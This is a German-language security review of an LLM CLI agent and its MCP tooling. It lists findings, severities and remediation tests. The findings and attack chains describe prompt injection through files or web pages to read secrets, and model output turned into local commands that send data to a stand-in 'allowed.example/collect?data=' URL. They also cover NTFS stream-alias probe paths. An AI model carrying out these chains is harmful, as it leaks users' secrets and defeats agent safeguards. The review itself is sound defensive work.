# Unabhängiger Security- und Architekturreview

**Review-Stand:** `210d53b49587faf7e91435f4eaaba6acd0bc0325`  
**Grundlage:** bereitgestellter Repository-Snapshot.

Der Review ist eine **statische Codeanalyse**. Es standen keine Ausführungswerkzeuge zur Verfügung; Tests, Windows-spezifische Dateisystemfälle und das Verhalten installierter Dependencies wurden nicht praktisch ausgeführt. Insbesondere ist `uv.lock` im bereitgestellten Snapshot nicht enthalten. Aussagen über konkrete transitive Paketversionen oder aktuelle CVEs sind deshalb nicht verifiziert.

Es wurden keine Dateien verändert und keine Patches erstellt. Aussagen in Dokumentation und Tests wurden als Prüfhinweise, nicht als Nachweis ihrer eigenen Richtigkeit behandelt.

---

## 1. Executive Summary

Das Projekt besitzt eine für einen kleinen LLM-CLI-Agenten **überdurchschnittlich sorgfältige Sicherheitsarchitektur**:

- feste maschinenweite Policy-Pfade;
- restriktive Defaults ohne Admin-Policy;
- getrennte Host-Allowlists für Modell, HTTP-MCP und Web;
- administrativ gebundene externe stdio-Launchprofile;
- deterministische Tool-Argumentvalidierung und Approvals;
- gesonderte Behandlung nicht vertrauenswürdiger Referenzdaten;
- umfangreiche Pfad-, Link- und Größenprüfungen;
- ein prozessisolierter JSON-Schema-Validator mit tatsächlich durchsetzbarer Laufzeitbegrenzung.

Das zentrale Beispiel aus der Aufgabenstellung ist erfüllt: **Eine normale Benutzerkonfiguration kann ohne passende Admin-Freigabe keinen OpenRouter- oder anderen externen Modellhost freischalten.**

Es wurden **keine bestätigten Critical- oder High-Schwachstellen** festgestellt. Es bestehen jedoch konkrete Medium-Findings und ein sicherheitsrelevanter, noch zu verifizierender SDK-Pfad:

1. **Dynamisch gerenderte Flow-Prompts können im One-Shot-Pfad zu lokalen Steuerbefehlen werden**, einschließlich Webabrufen.
2. **Bestimmte als sensibel ausgeblendete Verzeichnisse sind bei direktem Zugriff auf ihre Nachkommen nicht geschützt.**
3. **Einige lokale Dateioperationen verarbeiten Daten unbeschränkt**, bevor nachgelagerte Limits greifen.
4. Die Schutzwirkung des Schema-Workers erfasst **nicht nachweislich die SDK-seitige Verarbeitung von Tool-Output-Schemas**.
5. Dateisystem-Races, Windows-Stream-Aliase und Ressourcenverbrauch vor beziehungsweise innerhalb von Parsern bleiben relevant.
6. Fehlerdiagnosen können trotz deaktiviertem Inhaltslogging Nutzdaten persistieren.

### Ergebnis

- **Security Quality Score: 87/100 – Kategorie D**
- **Deployment Gate: `OPEN_WITH_FINDINGS`**
- **Score-Confidence: Medium**

**Unternehmenseignung:** Für einen kontrollierten, pragmatischen Unternehmenseinsatz grundsätzlich gut abgesichert. Vor breiter Einführung sollten insbesondere die beiden ersten Findings behoben und der SDK-Output-Schema-Pfad praktisch geprüft werden. Das Ergebnis ist keine pauschale Freigabe beliebiger externer MCP-Server.

---

## 2. Rekonstruierte Architektur

### 2.1 Ausführung und Datenflüsse

```text
CLI / Flow-TOML
    │
    ├── Benutzerkonfiguration
    ├── feste maschinenweite Admin-Policy
    ├── explizite Datei-/Prompt-/Output-Auswahl
    │
    ▼
Execution-Core
    │
    ├── ModelClient: OpenAI-kompatibel oder Ollama
    ├── externe MCP-Sessions
    ├── optional eingebauter Workspace-OS-MCP
    ├── optional separater OKF-MCP
    │
    ▼
Agent
    ├── optional OKF-Retrieval
    ├── transienter Referenzkontext
    └── Modell-/Tool-Schleife
             │
             ├── Routing und Serverstatus
             ├── JSON-Schema-Validierung im Worker
             ├── Approval
             └── session.call_tool()
```

**Zentrale Implementierungen:**

| Komponente | Verantwortung |
|---|---|
| `cli.py` | CLI, interaktive Bedienung, Admin-Inspektion |
| `execution.py` | gemeinsamer One-Shot-/Conversation-Core |
| `flow.py` | sequenzielle Orchestrierung, Variablen, Iterationen, Checkpoints |
| `agent.py` | Zustand, Promptaufbau, Trust- und Approval-Entscheidungen |
| `agent_conversation.py`, `agent_loop.py` | Conversation und Modellschleife |
| `agent_mcp.py` | MCP-Verbindungen, Prozessstarts, Toolregistrierung |
| `agent_tool_calls.py` | Validierung, Freigabe und Dispatch |
| `mcp_schema_guard.py` | begrenzte, prozessisolierte Schema-Prüfung |
| `os_operations.py` | Workspace-Dateioperationen |
| `file_context.py` | direkte Host-Dateizugriffe außerhalb des Tool-Loops |
| `web_context.py` | Webabruf und Confluence-Provider |
| `okf_mcp_server/*` | separate lokale read-only Knowledge-Quelle |

### 2.2 Wesentliche Trust Boundaries

1. **Benutzerkonfiguration → Admin-Policy**  
   Benutzerwerte wählen Funktionen; administrative Regeln begrenzen insbesondere Netzwerkziele, externe Prozessstarts und dauerhafte Freigaben.

2. **LLM-Ausgabe → Host-Aktion**  
   Modellgenerierte Toolaufrufe passieren Routing-, Schema- und Approval-Prüfungen.

3. **Workspace → übriges Dateisystem**  
   Pfadauflösung und weitere Prüfungen begrenzen eingebaute Dateioperationen. Die Implementierung ist allerdings pfadbasiert, nicht durchgehend handlebasiert.

4. **OKF-Root → übriges Dateisystem**  
   Bewusst vom Benutzer gewählte, separat begrenzte lokale Datenquelle. Die fehlende administrative Root-Allowlist ist **kein Finding**.

5. **Externe MCPs → Agent**  
   Metadaten und Ergebnisse bleiben fremdkontrolliert. Ein administrativ zugelassener stdio-Prozess ist **keine Sandbox**.

6. **Referenzdaten → Anweisungen**  
   Referenzdaten erhalten im normalen Ablauf keine administrativen Berechtigungen. Die semantische Trennung ist jedoch keine Garantie gegen Modellbeeinflussung.

7. **Flow-Daten → Orchestrierung**  
   Modelloutputs sollen nur Variablen und begrenzte Output-Pfade parametrisieren. Hier liegt Finding F-01.

---

## 3. Threat Model

### Assets

- Quellcode, Architekturunterlagen und Unternehmenswissen;
- lokale Credentials und Prozess-Secrets;
- Integrität von Workspace, Flow-Eingaben und Ergebnissen;
- administrative Netzwerk- und Prozessgrenzen;
- Verfügbarkeit des Agenten und Arbeitsplatzes;
- Vertraulichkeit von Logs und Diagnoseartefakten;
- Integrität installierter Software und ihrer Dependencies.

### Ausgangslagen und Angriffsflächen

| Ausgangslage | Relevante Entry Points und Risiken |
|---|---|
| **A – kooperativer Benutzer, Fehlkonfiguration** | Projekt-TOML, falscher Config-Pfad, breite Approvals, ungeeigneter Workspace |
| **B – manipulierte Workspace-Datei** | Referenzinhalt, versteckte Secrets, Dateisystem-Aliase, große Dateien, Checkpoints |
| **C – bösartige Webseite** | Prompt Injection, Parser-/Dekompressionslast, irreführende Inhalte |
| **D – kompromittierter MCP** | Toolnamen, Beschreibungen, Schemas, Rückgaben, SDK-Verarbeitung |
| **E – manipulierter Modelloutput** | Toolargumente, Flow-Variablen, dynamische Output-Pfade, lokale Befehlsinterpretation |
| **F – kompromittierte Dependency/Build-Komponente** | Build-Backend, MCP-/HTTP-/Parserbibliotheken, CI-Actions |
| **G – fehlende/fehlerhafte Administration** | Default-Policy, unvollständige Freigaben, Installation und Policy-Dateirechte |

Ein absichtlich sabotierender lokaler Administrator wurde **nicht** als primärer Angreifer gewertet. Ebenso wurden fehlende globale Firewall-Sperren oder die Möglichkeit, eine eigene Python-Anwendung zu starten, nicht als Produktfehler gezählt.

---

## 4. Prüfung der Soll-Anforderungen

Die folgende Requirements-Matrix bewertet die Implementierung, nicht eine noch unbekannte konkrete Firmeninstallation.

| Nr. | Anforderung | Ergebnis | Begründung / Codebezug |
|---:|---|---|---|
| 1 | deterministische Sicherheitsgrenzen | teilweise erfüllt | starke Host-Prüfungen; Flow-Steuerbefehlsübergang F-01 |
| 2 | Admin-/User-Trennung | erfüllt | feste Policy-Ladung, name-only stdio in `config.py` |
| 3 | Modell-Host-Allowlist | erfüllt | `create_model_client()` und Provider-Konstruktoren validieren |
| 4 | HTTP-MCP-Allowlist | teilweise erfüllt | `_connect_server()` validiert URL, Redirects aus; SDK-Nebenpfad F-04 offen |
| 5 | begrenzter Webkontext | erfüllt | leere Default-Allowlist, Redirect-Revalidierung, PAT-Redirectverbot |
| 6 | kontrollierte stdio-Starts | erfüllt | `_resolve_external_stdio_server()` materialisiert Adminprofil |
| 7 | Toolfreigaben | erfüllt, mit Hardeningbedarf | exakte Namen, fail-closed ohne TTY; Namensmehrdeutigkeit F-09 |
| 8 | Workspace-Grenze | teilweise erfüllt | statische Escapes blockiert; Race-/Windows-Fragen F-03/F-08 |
| 9 | sensitive Dateien | teilweise erfüllt | viele Schutzklassen wirksam; Nachkommenlücke F-02 |
| 10 | Prompt Injection erweitert keine Rechte | teilweise erfüllt | Toolgrenzen robust, aber Flow-Daten können Hostbefehle werden |
| 11 | externe MCPs als eigene Boundary | teilweise erfüllt | Identität und Input-Contracts geprüft; SDK-/Transportrestrisiken |
| 12 | Netzwerk/SSRF | teilweise erfüllt | direkte Pfade gut abgesichert; F-04 nicht abschließend verifiziert |
| 13 | Prozessausführung | erfüllt | Argumentlisten statt Shell; administrativer Launch; keine Sandboxbehauptung |
| 14 | Datenminimierung | teilweise erfüllt | kein Workspace im Systemprompt, URL-Redaktion; Fehlerkanäle F-07 |
| 15 | Logging/Audit | teilweise erfüllt | datenarme Defaults, Rotation; Fehlerpayloads und begrenzter Auditumfang |
| 16 | fail closed | überwiegend erfüllt | Policy-/Approvalfehler brechen ab; Config-Toleranz F-10 |
| 17 | sichere Defaults | erfüllt | Modell/MCP lokal, Web aus, externe stdio gesperrt |
| 18 | feste Maschinenpolicy | erfüllt | CLI verwendet keine benutzerwählbaren Policy-Pfade |
| 19 | optionale Hochrisikofunktionen | erfüllt | kein Docker-/allgemeines Codeexecution-Tool im Core |
| 20 | Supply Chain | teilweise erfüllt | gelockte CI vorgesehen, SBOM/Checksums; SCA/Provenance fehlen |
| 21 | Regressionstests | erfüllt, mit Laufzeitvorbehalt | breite Negativtests; selbst nicht ausgeführt |
| 22 | Unternehmensbetrieb | teilweise erfüllt | sinnvolles Deploymentkonzept; konkrete Distribution/Freigabe organisationsabhängig |
| 23 | realistische Sicherheitsversprechen | teilweise erfüllt | viele Restrisiken ehrlich dokumentiert; einzelne Aussagen zu weit oder veraltet |

**Wichtig:** „Erfüllt“ bei einer Code-Boundary bedeutet keinen Nachweis, dass eine konkrete Installation richtig administriert wurde.

---

## 5. Findings

### Übersicht

| ID | Finding | Kategorie | Severity | Confidence | Primärbereich |
|---|---|---|---|---|---|
| F-01 | Flow-Daten können lokale Hostbefehle auslösen | Confirmed Vulnerability | Medium | High | Security Boundaries |
| F-02 | sensible Verzeichnisnamen schützen Nachkommen nicht konsistent | Confirmed Vulnerability | Medium | High | Security Boundaries |
| F-03 | pfadbasierte Check-vs-Use-Fenster | Plausible Risk / Needs Verification | Medium | Medium | Security Boundaries |
| F-04 | SDK-seitige Output-Schema-Verarbeitung nicht abgesichert nachgewiesen | Plausible Risk / Needs Verification | High | Medium | LLM/MCP |
| F-05 | Ressourcenverbrauch vor Limits bzw. innerhalb von Parsern | Plausible Risk / Needs Verification | Medium | Medium | LLM/MCP |
| F-06 | unbeschränkte lokale Verarbeitung vor Ergebnislimits | Confirmed Vulnerability | Medium | High | LLM/MCP |
| F-07 | Fehlerdiagnosen umgehen teilweise Inhaltslogging-Opt-in | Confirmed Vulnerability | Low | High | Enterprise/Audit |
| F-08 | NTFS-Stream-/Alias-Semantik nicht belastbar abgesichert | Plausible Risk / Needs Verification | Medium | Medium | Security Boundaries |
| F-09 | exponierter Toolname ist keine eindeutige strukturierte Identität | Hardening Recommendation | Low | High | Security Boundaries |
| F-10 | tolerante Config-Ladung verschleiert Konfigurationsfehler | Hardening Recommendation | Low | High | Netzwerk/Config |

### F-04 – SDK-seitige Output-Schema-Verarbeitung: zusätzliche Validierungs- und Netzwerkpfade offen

**Kategorie:** Plausible Risk / Needs Verification  
**Severity:** High · **Confidence:** Medium

**Betroffen:** `agent_mcp.py::_start_server()`, `agent_tool_calls.py::process_tool_calls()`, `mcp_schema_guard.py`; externe Dependency `mcp`.

**Ursache:** Die eigene Validierung erfasst ausdrücklich `tool.inputSchema`. Ein vom Server geliefertes `outputSchema` wird in der eigenen Prüfung nicht vergleichbar behandelt. Toolaufrufe gehen anschließend an:

```python
session.call_tool(original_name, arguments)
```

Das konkrete Verhalten dieser SDK-Methode ist im bereitgestellten Material nicht einsehbar. Insbesondere ist zu prüfen, ob die eingesetzte SDK-Version Ergebnisse automatisch gegen serverkontrollierte Output-Schemas validiert.

**Angriffsvoraussetzung:** Zugelassener kompromittierter MCP und ein genehmigter beziehungsweise vorab freigegebener Toolaufruf.

**Möglicher Angriff:** Der MCP liefert ein Output-Schema mit externen Referenzen oder aufwendig expandierenden Referenz-/Kombinatorstrukturen. Falls das SDK diese mit einem unbeschränkten Standardvalidator verarbeitet, entstehen:

- Netzwerkzugriffe außerhalb der Agent-Allowlists oder
- synchrone CPU-/Speicherlast außerhalb des Schema-Workers.

**Vorhandener Schutz:** Input-Schemas werden sehr sorgfältig isoliert validiert. MCP-Aufrufe besitzen Deadlines.

**Warum nicht ausreichend nachgewiesen:** Diese Maßnahmen schützen nicht automatisch eine zusätzliche, SDK-interne synchrone Output-Validierung. Ein `asyncio.timeout()` beendet keine beliebige blockierende synchrone Verarbeitung im Event-Loop.

**Verifikation erforderlich:** Tatsächliches Lockfile und installierten SDK-Code prüfen, insbesondere `ClientSession.call_tool()`, Output-Schema-Cache, Ergebnisvalidierung und Referenzresolver.

**Empfehlung:** Auch diesen Pfad explizit in die Sicherheitsarchitektur aufnehmen; gegebenenfalls SDK-Validierung kontrolliert deaktivieren und durch dieselbe isolierte, netzwerkfreie Validierung ersetzen.

**Regressionstest:** Echter MCP-Testserver mit Output-Schema, das eine lokale HTTP-Canary referenziert, sowie komplexem lokalen Referenzgraphen. Erwartung: kein Canary-Request, begrenzte Laufzeit, keine Blockade des Event-Loops.

**Einstufungsgrenze:** Dies ist ausdrücklich **kein bestätigter SSRF- oder Approval-Bypass**. Die High-Severity beschreibt die mögliche Boundary-Verletzung bei Bestätigung.

---

### F-01 – Dynamische Flow-Prompts können als lokale Agent-Befehle ausgeführt werden

**Kategorie:** Confirmed Vulnerability  
**Severity:** Medium · **Confidence:** High

**Betroffen:** `flow.py::_render_prompt_file()`, `_prompt_for_iteration()`, `run_flow()`; `execution.py::run_once()` und `_run_prompt_sequence()`; `web_context_agent.py::ask()`.

**Ursache:** Flow-Variablen dürfen Modelloutput enthalten. Der fertig gerenderte Prompt geht im One-Shot-Pfad ungeprüft an `agent.ask()`. Dort werden bestimmte Zeichenfolgen nicht als Modellprompt, sondern als lokale Hostbefehle interpretiert.

`run_conversation()` verbietet lokale Befehle bereits explizit. **`run_once()` besitzt diese Prüfung nicht.**

**Statisch nachvollziehbares Beispiel:**

```text
Prompt-Template: {{var:task}}
Step-Variable:  task = "${steps.plan.output.task}"
Modellwert:     add_web_context https://allowed.example/collect?data=...
```

Der Folgeschritt kann dadurch einen Webabruf ausführen, obwohl sein statisches `add_web_context` leer ist.

**Auswirkungen:**

- modellkontrollierte Auswahl von Webrequests innerhalb der Allowlist;
- Übertragung von Daten in URL-Pfad oder Query;
- lokale Zustandsänderungen durch `enable`, `disable` oder `clear_web_context`;
- Ausfall beziehungsweise Fehlinterpretation des vorgesehenen Steps.

**Vorhandener Schutz:** Die Netzwerk-Allowlist bleibt wirksam. Beliebige externe Ziele oder neue stdio-Profile werden dadurch nicht freigeschaltet.

**Boundary-Verletzung:** Der Flow verspricht statische Auswahl von Webkontext und Capabilities. Modelloutput wird hier dennoch zu Host-Steuerung statt ausschließlich zu Daten.

**Empfehlung:** Lokale Befehlsverarbeitung vom eigentlichen Modellprompt-API trennen. Flow-Prompts dürfen diese Steuerung niemals aktivieren. Ein expliziter Flow-Aufruf der Webkontextfunktion muss weiterhin möglich bleiben.

**Regressionstest:** Dynamische Werte für alle lokalen Befehle in einem One-Shot-Flow; weder Netzwerkabruf noch Serverumschaltung darf stattfinden. Separate Tests für reguläres statisches `add_web_context`.

---

### F-02 – Sensible Verzeichnisnamen schützen direkte Nachkommen nicht konsistent

**Kategorie:** Confirmed Vulnerability  
**Severity:** Medium · **Confidence:** High

**Betroffen:** `os_operations.py::Workspace._is_sensitive_file()`, `_is_protected_path()` und darauf aufbauende Dateioperationen.

**Ursache:** Die Prüfung unterscheidet:

- sensible Namen nur am letzten Pfadbestandteil;
- rekursiv sensible Verzeichnisse über eine andere, kleinere Menge.

Beispielsweise sind `secrets` und `credentials` in `SENSITIVE_FILENAMES`, aber nicht in `SENSITIVE_DIRECTORY_NAMES`. Ebenso wird `name.startswith(".env")` nur auf den letzten Bestandteil angewandt.

Damit werden solche Verzeichnisse selbst ausgeblendet beziehungsweise abgewiesen, ihre direkt adressierten Kinder aber nicht notwendigerweise.

**Beispiel:**

```text
secrets/service.json
```

- `list_files(".")` blendet `secrets` aus.
- `list_files("secrets")` wird abgewiesen.
- `read_file("secrets/service.json")` trifft dagegen keine dieser Sensitivitätsregeln.

Entsprechendes gilt für Mutationen an solchen Nachkommen.

**Angriffsvoraussetzung:** Ein solcher vorhandener Ordner im Workspace und ein bekannter oder erratbarer Unterpfad.

**Angriff:** Eine manipulierte Referenzdatei nennt den direkten Pfad. Das LLM fordert einen Read an; bei aktiviertem Built-in-Read ist keine interaktive Bestätigung nötig.

**Auswirkung:** Offenlegung von Daten aus einem von der Anwendung selbst als sensibel behandelten Verzeichnis an das konfigurierte Modell.

**Vorhandener Schutz:** `.ssh`, `.aws`, `.git` und die übrigen tatsächlich in `SENSITIVE_DIRECTORY_NAMES` enthaltenen Kategorien sind davon nicht betroffen.

**Empfehlung:** Sensible Pfadkomponenten konsistent behandeln. Ein als geschütztes Verzeichnis klassifizierter Pfad muss seine Nachkommen schützen.

**Regressionstest:** Direkte Reads, Range-Reads, Writes, Copy/Move und Metadatenzugriffe auf Nachkommen von `secrets`, `credentials` und `.env*`-Verzeichnissen.

Dies ist **keine Forderung nach perfekter DLP**, sondern eine Inkonsistenz innerhalb vorhandener expliziter Schutzregeln.

---

### F-03 – Dateisystemgrenzen sind bei konkurrierendem Pfadaustausch nicht atomar

**Kategorie:** Plausible Risk / Needs Verification  
**Severity:** Medium · **Confidence:** Medium

**Betroffen:** `os_operations.py`, `file_context.py`, `agent.py::_safe_dump_path()`, `okf_mcp_server/repository.py::_read_text()`.

**Ursache:** Mehrere Operationen folgen dem Muster:

```text
resolve / stat / Linkprüfung / Schutzprüfung
→ späterer Zugriff über denselben Pfadnamen
```

Besonders sichtbar ist dies bei vorbereiteten `OutputTarget`-Objekten: Zwischen Vorbereitung und Ausgabe kann ein vollständiger Modell-/Toollauf liegen.

`_atomic_replace_text()` prüft den Ziel-Dateieintrag erneut, bindet aber nicht die gesamte Elternverzeichniskette an geprüfte Handles.

**Angriffsvoraussetzung:** Ein anderer Prozess mit passenden Dateisystemrechten kann während des Laufs Pfadkomponenten austauschen. Eine statische manipulierte Textdatei allein reicht nicht.

**Möglicher Angriff:** Ein geprüftes Unterverzeichnis wird nach der Prüfung durch einen Verweis auf ein anderes Ziel ersetzt. Anschließendes Öffnen, Erstellen einer temporären Datei oder Ersetzen folgt dem veränderten Pfad.

**Auswirkung:** Potenzielles Lesen oder Schreiben außerhalb des vorgesehenen Roots.

**Vorhandener Schutz:** Statische Traversals, viele Symlink-/Reparse-Fälle und bestehende Hardlinks werden gut abgewehrt.

**Kalibrierung:** Kein High-Finding: Eine realistische Ausnutzung benötigt einen konkurrierenden Akteur. Ein kompromittierter stdio-MCP besitzt ohnehin eigene lokale Rechte; der Agent-Race erweitert dessen Rechte nicht automatisch.

**Empfehlung:** Für kritische I/O-Pfade handle-/deskriptorbasierte Operationen und konsistente Revalidierung verwenden. Bis dahin die Race-Grenze ausdrücklich dokumentieren.

**Regressionstest:** Deterministischer Austausch eines Elternverzeichnisses zwischen Prüfung und Zugriff; externe Canary-Dateien müssen unverändert beziehungsweise ungelesen bleiben.

---

### F-05 – Ressourcenlimits greifen teilweise erst nach teurer Transport-/Parserarbeit

**Kategorie:** Plausible Risk / Needs Verification  
**Severity:** Medium · **Confidence:** Medium

**Betroffen:** `agent_mcp.py`, `agent_tool_calls.py`, `model_http.py`, `web_context.py`, `pdf_text.py`.

**Ursachen und Grenzen:**

- MCP-Metadaten und Resultate werden erst nach Rückgabe aus dem SDK begrenzt.
- HTTP-Limits zählen mit `aiter_bytes()` bereits HTTP-dekodierte Daten. Sie beweisen keine harte Grenze für kurzzeitige Speicherbelegung innerhalb des Decoders.
- PDF-Ausgabelimits werden nach `page.extract_text()` geprüft. Der Worker besitzt ein Timeout, aber kein hartes Speicherlimit.

**Angriffsvoraussetzung:** Fehlerhafter/kompromittierter zugelassener Dienst oder eine entsprechend präparierte PDF.

**Auswirkung:** Erheblicher Speicherverbrauch, Prozessabbruch oder Beeinträchtigung des Arbeitsplatzes, bevor die Anwendung den Inhalt ablehnt.

**Vorhandener Schutz:** Streaming, zahlreiche Größenlimits, Parser-Worker und Timeouts sind wirksam und reduzieren das Risiko erheblich. Sie sind aber nicht mit einer Pre-Parse-Speichergrenze gleichzusetzen.

**Empfehlung:**

- öffentlich unterstützte SDK-Transportlimits einsetzen, sobald verfügbar;
- Dekompression mit begrenzter Ausgabe prüfen;
- optionale Betriebssystem-Ressourcenlimits für Parserworker;
- maximale kurzzeitige Speicherlast mit adversarial Fixtures messen.

**Regressionstest:** Große MCP-Nachrichten, stark komprimierte HTTP-Antworten und PDFs mit hoher Expansion; überwachte Laufzeit und Peak-RSS.

**Abgrenzung zu F-04:** F-05 betrifft Materialisierung und Parserressourcen, nicht zusätzliche Output-Schema-Validierung oder deren Netzwerkzugriffe.

---

### F-06 – Lokale Operationen verarbeiten Dateien und Verzeichnisse unbeschränkt

**Kategorie:** Confirmed Vulnerability  
**Severity:** Medium · **Confidence:** High

**Betroffen:**

- `os_operations.py::Workspace._existing_line_ending()`;
- `Workspace.list_files()`;
- `okf_mcp_server/repository.py::knowledge_index()`.

**Ursache:**

1. Vor einem `write_file()` wird eine bestehende Datei vollständig mit `read_bytes()` gelesen, nur um Zeilenenden zu bestimmen.
2. Verzeichnislisten werden vollständig materialisiert und sortiert.
3. Beim synthetisierten OKF-Index greift `max_index_entries` erst nach dem Aufbau der sortierten Kandidatenliste.

**Angriff/Fehlerszenario:** Der Workspace enthält eine sehr große Textdatei, etwa einen generierten Export. Ein genehmigter kleiner Schreibauftrag auf diese Datei verursacht vorher das vollständige Einlesen des alten Inhalts. Eine große Sparse-Datei kann besonders ungünstig sein.

Bei großen Verzeichnissen genügt ein Read-only-Listing.

**Auswirkungen:** Lokaler Speicher-/CPU-DoS. Nachgelagerte MCP-Resultlimits verhindern die vorherige Verarbeitung nicht.

**Vorhandener Schutz:** `search_text()` und `find_files()` besitzen dagegen bereits sinnvolle Traversalbudgets.

**Empfehlung:** Zeilenendenerkennung streamingbasiert mit begrenztem Puffer; Verzeichnisverarbeitung mit frühem Entry-Budget und expliziter Truncation.

**Regressionstest:** Große bestehende Datei mit kleinem Ersatzinhalt sowie sehr viele Verzeichniseinträge. Der Test muss die Verarbeitung vor vollständiger Materialisierung begrenzen.

---

### F-08 – Windows-Stream- und Alias-Semantik benötigt gezielte Verifikation

**Kategorie:** Plausible Risk / Needs Verification  
**Severity:** Medium · **Confidence:** Medium

**Betroffen:** `os_operations.py::resolve_path()`, `resolve_direct_path()`, `_is_sensitive_file()`; `file_context.py`.

**Ursache:** Die Prüfung verbietet Windows-Drive-Pfade und Traversals, aber nicht explizit NTFS-Streamsyntax. Sensitivität und dynamischer Schutz beruhen teilweise auf Pfadnamen beziehungsweise `Path`-Gleichheit.

Zu prüfen sind insbesondere:

```text
credentials.json:note.txt
custom-agent.toml:note.txt
credentials.json::$DATA
```

**Mögliche Wirkung:** Zugriffe auf Streams geschützter Dateien oder Aliaszugriffe, bei denen die Schutzklassifikation einen anderen Namen sieht als die tatsächlich adressierte Datei.

**Wichtige Einschränkung:** Ob die konkrete Windows-/Python-Kombination insbesondere den Default-Stream-Alias beim Auflösen kanonisiert, wurde nicht ausgeführt. Ein erfolgreicher Zugriff auf den geschützten Hauptinhalt wird hier **nicht behauptet**.

**Vorhandener Schutz:** Drive-/Traversalprüfungen, direkte Pfadprüfung bei Mutationen, Hardlink- und Reparse-Prüfungen.

**Empfehlung:** Streams explizit ausschließen, sofern fachlich nicht benötigt; ansonsten Schutz auf tatsächliche Dateiidentität beziehen.

**Regressionstest:** Windows-native Tests mit benannten und unbenannten Streams, aktiver Config als Ziel sowie zusätzlich DOS-Gerätenamen und relevanten Normalisierungsvarianten.

---

### F-07 – Fehlerdiagnosen können Nutzdaten trotz deaktiviertem Inhaltslogging speichern

**Kategorie:** Confirmed Vulnerability  
**Severity:** Low · **Confidence:** High

**Betroffen:** `agent_tool_calls.py`, `agent_conversation.py::_append_tool_error()`, `cli.py::print_error()`, Web-Fehlerpfade.

**Ursache:** Schemafehler können den abgewiesenen Wert enthalten. Diese Meldung wird an `_append_tool_error()` übergeben und unabhängig von `log_tool_calls` mit `logger.warning()` protokolliert.

Beispiel: Ein vertraulicher String wird für einen Integerparameter geliefert. Der Validator erzeugt sinngemäß:

```text
'vertraulicher Inhalt' is not of type 'integer'
```

Die Worker-Kürzung begrenzt die Länge, entfernt aber nicht den Inhalt.

Zusätzlich werden URLs bei erfolgreichen Webabrufen redigiert, während ungefilterte HTTP-Ausnahmen im Fehlerpfad Querywerte im Terminal beziehungsweise Debug-Traceback offenlegen können.

**Auswirkung:** Unbeabsichtigte lokale Persistenz beziehungsweise Anzeige vertraulicher Nutzdaten.

**Vorhandener Schutz:** Inhaltslogging ist normalerweise aus, Terminalsteuerzeichen werden bereinigt, Fehlertexte sind teilweise begrenzt. Das ist kein Schutz vor inhaltlicher Offenlegung.

**Empfehlung:** Für Standardlogs strukturierte Fehlercodes, Toolname und Argumentpfad statt vollständiger Validator-Nachrichten verwenden. URL-Redaktion auch an Fehlergrenzen anwenden.

**Regressionstest:** Secret-Sentinels in ungültigen Toolargumenten und URL-Querys; bei Defaultlogging dürfen sie nicht in Logs beziehungsweise redigierten Fehlerausgaben erscheinen.

---

### F-09 – Exponierte Toolnamen sind nicht strukturell eindeutig

**Kategorie:** Hardening Recommendation  
**Severity:** Low · **Confidence:** High

**Betroffen:** `agent_mcp.py::_start_server()`, `agent.py::_requires_approval()`, `execution.py::build_preapproval_callback()`.

**Ursache:** Die Zusammensetzung ist nicht injektiv:

```text
Server a__b + Tool c
Server a    + Tool b__c
→ jeweils a__b__c
```

Gleichzeitige Kollisionen werden korrekt abgewiesen. Prozess-/Sessionfreigaben hängen jedoch nur am flachen Namen und bleiben bei Deaktivierung bestehen.

Bei geänderten Toolangeboten und erneuter Verbindung kann eine andere Server-/Toolzerlegung denselben freigegebenen Namen erhalten.

**Warum nur Hardening:** Ein einfacher gleichzeitiger Registrierungsbypass ist verhindert. Ein relevanter Übergang benötigt zusätzliche Lifecycle- und Metadatenänderungen; eine unmittelbare normale Permission-Escalation wurde nicht nachgewiesen.

**Empfehlung:** Namen eindeutig kodieren oder Sessionfreigaben intern zusätzlich an strukturierte Server-/Toolidentität binden.

**Regressionstest:** Namenskollisionen sowohl gleichzeitig als auch nach Deaktivierung und erneuter Registrierung.

---

### F-10 – Config-Toleranz macht Tippfehler und fehlende explizite Dateien schwer erkennbar

**Kategorie:** Hardening Recommendation  
**Severity:** Low · **Confidence:** High

**Betroffen:** `config.py::load_config()`, `_model_config()`; `admin_config.py::load_admin_config()`.

**Ursache:**

- Ein ausdrücklich genannter, nicht vorhandener User-Config-Pfad liefert Defaults.
- Zahlreiche unbekannte Schlüssel werden ignoriert.
- Einige Werte werden statt strikter Typprüfung mit `str()`, `int()` oder `float()` konvertiert.
- Ein leerer `api_key_env` wird faktisch wie „nicht konfiguriert“ behandelt.

**Auswirkung:** Falsche Konfiguration kann unbemerkt zu einem anderen Betriebsmodus führen. Beispielsweise verwendet ein vertippter Config-Pfad das lokale Defaultmodell.

**Vorhandener Schutz:** Das führt nicht automatisch zu extern permissiven Defaults. Netzwerk- und Prozessgrenzen bleiben bestehen.

**Empfehlung:** Fehlende explizite Config-Dateien ablehnen; unbekannte sicherheitsrelevante Schlüssel und Credential-Einstellungen strikt validieren.

**Regressionstest:** Vertippte Pfade, Schlüssel und leere Credential-Quellen müssen klar diagnostiziert werden.

---

## 6. Angriffsketten

### 6.1 Manipulierter Kontext → direkter Secret-Read → Modellweitergabe

1. Im Workspace existiert `secrets/service.json`.
2. Eine manipulierte Datei oder Webseite fordert einen direkten Read dieses Pfads.
3. Das Modell verwendet `os__read_file`.
4. F-02 lässt den Zugriff trotz geschütztem Elternnamen zu.
5. Der Inhalt gelangt als Toolresultat zum konfigurierten Modell.

**Reale Verletzung:** vorhandene Sensitive-Path-Regel.  
**Keine notwendige Zusatzannahme:** bösartiger lokaler Administrator.

### 6.2 Modelloutput → Flow-Variable → Host-Webrequest

1. Ein Planungsstep produziert ein Feld `task`.
2. Ein Folgetemplate besteht aus `{{var:task}}`.
3. Das Feld enthält einen lokalen `add_web_context`-Befehl.
4. F-01 führt einen Host-Webrequest aus statt einer normalen Modellanfrage.
5. Daten können an einen bereits erlaubten Webhost übertragen werden.

**Reale Verletzung:** statische Flow-Webkonfiguration.  
**Weiterhin wirksam:** administrative Host-Allowlist.

### 6.3 Genehmigtes MCP-Tool → SDK-interne Verarbeitung

1. Ein zugelassener MCP bietet ein plausibles Tool an.
2. Der Benutzer oder ein Contract-Pin erlaubt dessen Aufruf.
3. Ergebnis beziehungsweise Output-Schema trifft auf zusätzliche SDK-Verarbeitung.
4. Je nach tatsächlicher SDK-Version entstehen Last oder zusätzliche Requests.

**Status:** F-04/F-05, noch praktisch zu verifizieren.

### 6.4 Bereits freigegebene Capabilities → Datenabfluss ohne neuen Bypass

Ein Modell kann gelesenen Quellcode als Argument an ein bereits freigegebenes externes Tool senden.

